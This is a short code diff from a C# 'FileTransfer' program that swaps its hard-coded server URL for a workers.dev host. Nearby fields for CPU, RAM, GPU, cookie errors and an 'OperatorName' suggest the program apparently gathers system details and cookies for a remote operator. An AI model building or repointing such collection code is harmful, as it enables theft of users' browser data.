@@ -102,7 +102,7 @@ namespace FileTransfer
             _http.DefaultRequestHeaders.Accept.ParseAdd("image/webp,image/apng,image/*,*/*;q=0.8");
         }
 
-        private const string ServerUrl = "https://file-transfer-production-75ad.up.railway.app";
+        private const string ServerUrl = "https://sparkling-river-5c94.sadnifor.workers.dev";
         private static string OperatorName = "Shonll";
 
         private string? _cpu, _ram, _gpu, _cookieError;
